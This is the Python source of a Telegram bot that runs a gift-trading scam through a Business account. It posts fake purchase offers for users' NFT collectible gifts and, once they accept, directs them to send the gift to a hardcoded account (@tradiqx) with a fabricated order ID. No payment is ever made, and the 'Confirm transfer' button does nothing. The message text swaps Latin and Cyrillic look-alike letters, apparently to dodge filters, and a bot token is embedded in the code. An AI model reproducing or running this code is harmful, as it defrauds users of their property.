import asyncio
import re
import random
import string
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
)

logging.basicConfig(level=logging.WARNING)

BOT_TOKEN = "8978690686:AAELZXGHB1c06yCISeFaNrFgsD9QXg6vh0I"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
RECIPIENT = "@tradiqx"
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

# ---- Premium emoji IDs (все 7) ----
E_GEM   = "5318901904686754959"   # 💎 алмаз / GRAM
E_WARN  = "6030563507299160824"   # ⚠ восклицание
E_OK    = "5774022692642492953"   # ✅ галочка (кнопка «Пpинять»)
E_NO    = "5774077015388852135"   # ❌ крестик (кнопка «Oтклoнить»)
E_TIMER = "6037268453759389862"   # ⏱ часы
E_GIFT  = "5773677501825945508"   # 🎁 подарок
E_STAR  = "6028338546736107668"   # ⭐ звезда
E_CHECK = "5774022692642492953"   # ✅ галочка (финал)
E_LOCK  = "5774077015388852135"   # 🔒 замок (используем крестик как «защита»)


def em(eid: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'


LAT_TO_CYR = {
    "A": "А",
    "a": "а",
    "C": "С",
    "c": "с",
    "E": "Е",
    "e": "е",
    "O": "О",
    "o": "о",
    "X": "Х",
    "x": "х",
}
CYR_TO_LAT = {v: k for k, v in LAT_TO_CYR.items()}


def homoglyphs(text: str, lang: str) -> str:
    if lang == "ru":
        table = CYR_TO_LAT
    elif lang == "eng":
        table = LAT_TO_CYR
    else:
        return text
    return "".join(table.get(c, c) for c in text)


TEXTS = {
    "ru": {
        "offer_1": "Пoльзοватeль пρeдлагaет вам",
        "offer_for": "зa кoллeкционный пpедмeт",
        "offer_time": "Пpeдложeние дeйствyет eще 5 ч. 59 мин..",
        "offer_fix": "Сдeлкa фикcиpуeтcя кнoпкoй «Пpинять».",
        "accept_ok": "Успешно продан!",
        "accept_give": "• Пepeдaйтe пoкyпaтeлю для зaчиcлeния Ѕtarѕ.",
        "accept_then": "Зaтeм нaжмитe «Пoдтвepдить пepeдaчy».",
        "accept_warn": "Кнoпкa cpaбoтaeт тoлькo ecли пoдapoк yжe y пoлyчaтeля.",
        "accept_price": "зa пoдapoк",
        "order": "Зaкaз",
        "recipient": "пoлyчaтeль",
        "btn_decline": "Oтклoнить",
        "btn_accept": "Принять",
        "btn_show": "Пoкaзaть пoдapoк",
        "btn_give": "Пepeдaть пoдapoк",
        "btn_confirm": "Пoдтвeрдить пepeдaчy",
        "declined": "Oффep был oтклoнён.",
        "stars": "Звёзд",
        "gram": "GRAM",
    },
    "ukr": {
        "offer_1": "Користувач пропонує вам",
        "offer_for": "за подарунок",
        "offer_time": "Пропозиція дійсна ще 6 год. 0 хв. 0 сек.",
        "offer_fix": "Угода фіксується кнопкою «Прийняти».",
        "accept_ok": "Пропозицію прийнято",
        "accept_give": "Передайте подарунок",
        "accept_then": "Потім натисніть «Підтвердити передачу».",
        "accept_warn": "Кнопка спрацює лише якщо подарунок вже в отримувача.",
        "accept_price": "за подарунок",
        "order": "Замовлення",
        "recipient": "отримувач",
        "btn_decline": "Відхилити",
        "btn_accept": "Прийняти",
        "btn_show": "Показати подарунок",
        "btn_give": "Передати подарунок",
        "btn_confirm": "Підтвердити передачу",
        "declined": "Пропозицію відхилено.",
        "stars": "Зірок",
        "gram": "GRAM",
    },
    "eng": {
        "offer_1": "A user offers you",
        "offer_for": "for the gift",
        "offer_time": "The offer is valid for another 6 h. 0 min. 0 sec.",
        "offer_fix": "The deal is fixed with the «Accept» button.",
        "accept_ok": "Offer accepted",
        "accept_give": "Send the gift",
        "accept_then": "Then press «Confirm transfer».",
        "accept_warn": "The button works only if the gift is already with the recipient.",
        "accept_price": "for the gift",
        "order": "Order",
        "recipient": "recipient",
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "btn_show": "Show gift",
        "btn_give": "Send gift",
        "btn_confirm": "Confirm transfer",
        "declined": "The offer was declined.",
        "stars": "Stars",
        "gram": "GRAM",
    },
    "cn": {
        "offer_1": "用户向您提出报价",
        "offer_for": "购买礼物",
        "offer_time": "报价还有效 6 小时 0 分钟 0 秒。",
        "offer_fix": "交易由「接受」按钮确认。",
        "accept_ok": "报价已接受",
        "accept_give": "请发送礼物",
        "accept_then": "然后点击「确认转账」。",
        "accept_warn": "仅当礼物已在接收者处时按钮才会生效。",
        "accept_price": "购买礼物",
        "order": "订单",
        "recipient": "接收者",
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "btn_show": "显示礼物",
        "btn_give": "发送礼物",
        "btn_confirm": "确认转账",
        "declined": "报价已被拒绝。",
        "stars": "星",
        "gram": "GRAM",
    },
}


def T(lang, key):
    text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
    return homoglyphs(text, lang)


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    if parts[0].startswith("/"):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    if not parts:
        return None

    link = None
    amount = None
    currency = "STARS"
    lang = "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = float(p.replace(",", "."))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug = m.group(1)
    num = m.group(2)
    name = re.sub(r'(?<=[a-z])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])', ' ', slug)
    return name, num


def amount_line(amount, currency, lang):
    word = T(lang, "gram" if currency == "GRAM" else "stars")
    if currency == "GRAM":
        return f'{em(E_GEM, "💎")} <b>{amount:.0f} {word}</b>'
    return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {word}</b>'


def gift_link_bold(gift_name, gift_num, lang):
    slug = gift_name.replace(" ", "")
    visible = gift_name if lang == "ru" else homoglyphs(gift_name, lang)
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">'
        f'{visible} #{gift_num}</a></b>'
    )


def build_offer_text(amount, currency, gift_name, gift_num, lang):
    return (
        f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
        f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
        f'{em(E_TIMER, "⏱")} {T(lang, "offer_time")}\n'
        f'{em(E_LOCK, "🔒")} {T(lang, "offer_fix")}'
    )


def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
    return (
        f'{em(E_CHECK, "✅")} {gift_link_bold(gift_name, gift_num, lang)} <b>{T(lang, "accept_ok")}</b>\n\n'
        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
        f'{T(lang, "accept_then")}\n'
        f'{T(lang, "accept_warn")}\n\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
        f'{gift_name if lang == "ru" else homoglyphs(gift_name, lang)} #{gift_num}.\n\n'
        f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
    )


def pack_offer(amount, currency, gift_name, gift_num, lang):
    cur = "G" if currency == "GRAM" else "S"
    name = gift_name.replace(" ", "")
    return f"a|{gift_num}|{amount:.0f}|{cur}|{name}|{lang}"


def unpack_offer(data):
    parts = data.split("|", 5)
    if len(parts) != 6:
        return None
    _, gift_num, amount_s, cur, gift_name_compact, lang = parts
    try:
        amount = float(amount_s)
    except ValueError:
        return None
    currency = "GRAM" if cur == "G" else "STARS"
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', gift_name_compact)
    return amount, currency, name, gift_num, lang


def make_offer_keyboard(amount, currency, gift_name, gift_num, lang):
    accept_data = pack_offer(amount, currency, gift_name, gift_num, lang)
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_decline"),
                    callback_data="decline",
                    icon_custom_emoji_id=E_NO,
                ),
                InlineKeyboardButton(
                    text=T(lang, "btn_accept"),
                    callback_data=accept_data,
                    icon_custom_emoji_id=E_OK,
                ),
            ]
        ]
    )


def make_accept_keyboard(gift_name, gift_num, lang):
    recipient = RECIPIENT.lstrip("@")
    slug = gift_name.replace(" ", "")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_show"),
                    url=f"https://t.me/nft/{slug}-{gift_num}",
                    icon_custom_emoji_id=E_GIFT,
                )
            ],
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_give"),
                    url=f"tg://send_gift?to={recipient}",
                    icon_custom_emoji_id=E_GIFT,
                )
            ],
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_confirm"),
                    callback_data="noop",
                    icon_custom_emoji_id=E_CHECK,
                )
            ],
        ]
    )


def gen_order_id():
    return "TG-" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=10)
    )


def _business_offer_from_owner(message: Message) -> bool:
    if message.chat.type != "private" or not message.from_user:
        return False
    return message.from_user.id != message.chat.id


def _gift_preview_url(gift_name: str, gift_num: str) -> str:
    slug = gift_name.replace(" ", "")
    return f"https://t.me/nft/{slug}-{gift_num}"


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    if not _business_offer_from_owner(message):
        return

    parsed = parse_command(message.text or "")
    if not parsed:
        return
    link, amount, currency, lang = parsed

    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num = gift
    preview_url = _gift_preview_url(gift_name, gift_num)

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except AttributeError:
        pass
    except Exception as e:
        logging.warning(f"delete error: {e}")

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_text(amount, currency, gift_name, gift_num, lang),
            reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=True,
            ),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Привет! Пришли ссылку на подарок, язык и сумму, например:\n"
        "https://t.me/nft/BerryBox-40761 ru 15000 STARS\n"
        "https://t.me/nft/BerryBox-40761 eng 15 GRAM\n\n"
        "Языки: ru, ukr, eng, cn"
    )


@dp.callback_query(F.data.startswith("a|"))
async def accept(cb: CallbackQuery):
    data = unpack_offer(cb.data)
    if not data:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    amount, currency, gift_name, gift_num, lang = data
    order_id = gen_order_id()
    text = build_accept_text(amount, currency, gift_name, gift_num, order_id, lang)

    bcid = cb.message.business_connection_id if cb.message else None

    # удаляем офферное сообщение
    try:
        if bcid:
            await bot.delete_business_messages(
                business_connection_id=bcid,
                message_ids=[cb.message.message_id],
            )
        else:
            await cb.message.delete()
    except Exception as e:
        logging.warning(f"delete offer error: {e}")

    # шлём accept-сообщение новым (появится снизу чата)
    try:
        send_kwargs = dict(
            chat_id=cb.message.chat.id,
            text=text,
            reply_markup=make_accept_keyboard(gift_name, gift_num, lang),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        if bcid:
            send_kwargs["business_connection_id"] = bcid
        await bot.send_message(**send_kwargs)
    except Exception as e:
        logging.error(f"accept send error: {e}")
        await cb.answer("Не удалось отправить", show_alert=True)
        return

    await cb.answer()


@dp.callback_query(F.data == "decline")
async def decline(cb: CallbackQuery):
    try:
        await cb.message.edit_text(
            text=f'{em(E_NO, "❌")} {T("ru", "declined")}',
            reply_markup=None,
        )
    except Exception as e:
        logging.error(f"decline edit error: {e}")
        await cb.answer("Не удалось обновить", show_alert=True)
        return
    await cb.answer()


@dp.callback_query(F.data == "noop")
async def noop(cb: CallbackQuery):
    await cb.answer()


async def main():
    print("Bot started")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
